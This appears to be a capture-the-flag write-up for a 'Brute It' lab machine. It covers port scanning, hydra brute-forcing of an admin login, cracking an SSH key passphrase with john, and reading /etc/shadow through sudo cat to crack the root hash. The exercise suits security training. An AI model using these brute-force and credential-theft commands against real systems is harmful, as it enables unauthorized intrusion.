## Target: 10.81.175.252
### Recon
**Nmap:** `rustscan -a 10.81.175.252 -- -A`
### Enumeration
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
**Web Findings:**
`dirsearch -u 10.81.175.252`
[22:07:27] 200 -  385B  - /admin/
### Vulnerabilities
The name of the lab is Brute It, so let's brute it...
`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.175.252 http-post-form "/admin/:user=^USER^&pass=^PASS^:invalid"`
[80][http-post-form] host: 10.81.175.252   login: **admin**   password: **xavier**
### Exploitation
When logged in, we see a flag as well as a private key, which we are prompted to crack. 
`python3 /opt/john/ssh2john.py id_rsa > pass.hash`
`john --wordlist=/usr/share/wordlists/rockyou.txt pass.hash`
**rockinroll       (id_rsa)**
We are told the user is called John.
All we need to do is log in to john's account via ssh with this command:
`ssh -i id_rsa john@10.81.175.252`
Supply the rockinroll password and we're in
### Post Exploitation
`sudo -l` shows us that john can run the `cat` command as the root user.
There is no formal privilege escalation vector. However, we can use `sudo cat` to view files owned by root.
### Privilege Escalation
`cat /etc/shadow` shows us the hashed password of the root user.
We copy the hash and paste it on our local machine into a file called `roothash`
`john roothash` give us **football** as the plaintext password for root
We can either make an educated guess that the root flag lives at `/root/root.txt` (which it does), or we can go ahead and `su -` into the root account and hunt it down with to view it.

### Notes
If the sudo binary only allows file-read, don't forget about /etc/shadow. 
Remember the syntax for ssh2john and john commands:
	`python3 /path/to/ssh2john </path/to/encrypted_key> > <output.file>`
	`john <saved.hash>`
